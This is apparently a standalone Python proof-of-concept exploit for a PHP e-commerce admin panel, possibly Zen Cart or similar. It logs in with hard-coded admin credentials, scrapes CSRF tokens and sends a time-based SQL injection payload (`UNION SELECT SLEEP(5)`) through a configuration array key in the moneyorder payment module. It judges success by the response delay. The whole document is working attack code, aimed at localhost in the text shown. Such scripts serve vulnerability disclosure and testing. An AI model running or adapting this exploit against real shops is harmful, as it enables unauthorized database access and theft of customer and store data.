import urllib.request, urllib.parse, http.cookiejar, re, time

# --- Configuration ---
URL = "http://localhost:8000/stomP-LGR-Feast"
HDR = {"Host": "localhost:8000"}
AUTH = {"admin_name": "admin", "admin_pass": "Admin123@"}
SLEEP = 5

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def go(path, data=None):
    if data: data = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(f"{URL}/{path}", data=data, headers=HDR)
    return opener.open(req).read().decode(errors='ignore')

def get_token(html):
    return re.search(r'securityToken" value="([^"]+)"', html).group(1)

print("[*] Testing SQL Injection (Time-based)...")
try:
    # 1. Login
    t = get_token(go("index.php?cmd=login"))
    go("index.php?cmd=login", {**AUTH, "securityToken": t, "action": "do"+t})

    # 2. Get Module Token
    t2 = get_token(go("index.php?cmd=modules&set=payment&module=moneyorder&action=edit"))

    # 3. Trigger SQLi
    sqli = f"INVALID' UNION SELECT SLEEP({SLEEP}), '2' #"
    payload = {"securityToken": t2, "action": "saveall", f"configuration[{sqli}]": "x"}
    
    start = time.time()
    go("index.php?cmd=modules&set=payment&module=moneyorder&action=save", payload)
    diff = time.time() - start

    print(f"[*] Time elapsed: {diff:.2f}s")
    print("[+] Success!" if diff >= SLEEP else "[-] Failed.")

except Exception as e:
    print(f"[!] Error: {e}")
